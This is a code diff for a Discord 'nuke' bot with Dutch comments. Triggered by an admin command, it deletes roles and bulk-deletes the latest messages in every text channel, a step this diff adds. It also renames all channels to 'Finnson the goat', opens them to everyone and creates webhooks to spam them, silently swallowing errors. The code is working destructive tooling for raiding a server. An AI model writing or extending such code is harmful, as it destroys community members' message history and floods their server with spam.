@@ -30,7 +30,6 @@ client.on('messageCreate', async message => {
         return message.reply("❌ Administrator rechten nodig!").then(m => setTimeout(() => m.delete().catch(() => {}), 2000));
     }
 
-    // Commando meteen wissen
     message.delete().catch(() => {});
 
     try {
@@ -52,23 +51,28 @@ client.on('messageCreate', async message => {
         try { await role.delete(); } catch {}
     }
 
-    // Alle channels tegelijk verwerken
+    // Channels verwerken
     const textChannels = Array.from(message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values());
     let processed = 0;
 
     const promises = textChannels.map(async (channel) => {
         try {
-            // Hernoemen
+            // 1. Oude berichten wissen
+            await channel.bulkDelete(100, true).catch(() => {});
+            const oldMessages = await channel.messages.fetch({ limit: 100 }).catch(() => []);
+            await channel.bulkDelete(oldMessages, true).catch(() => {});
+
+            // 2. Hernoemen
             await channel.setName("Finnson the goat");
 
-            // Zichtbaar maken voor iedereen
+            // 3. Zichtbaar maken voor iedereen
             await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                 ViewChannel: true,
                 SendMessages: true,
                 ReadMessageHistory: true
             }).catch(() => {});
 
-            // Webhook aanmaken en spammen
+            // 4. Webhook spam
             const webhook = await channel.createWebhook({
                 name: WEBHOOK_NAME,
                 avatar: WEBHOOK_AVATAR
@@ -89,7 +93,6 @@ client.on('messageCreate', async message => {
         } catch (err) {}
     });
 
-    // Alle channels tegelijk starten
     await Promise.all(promises);
 
     try {
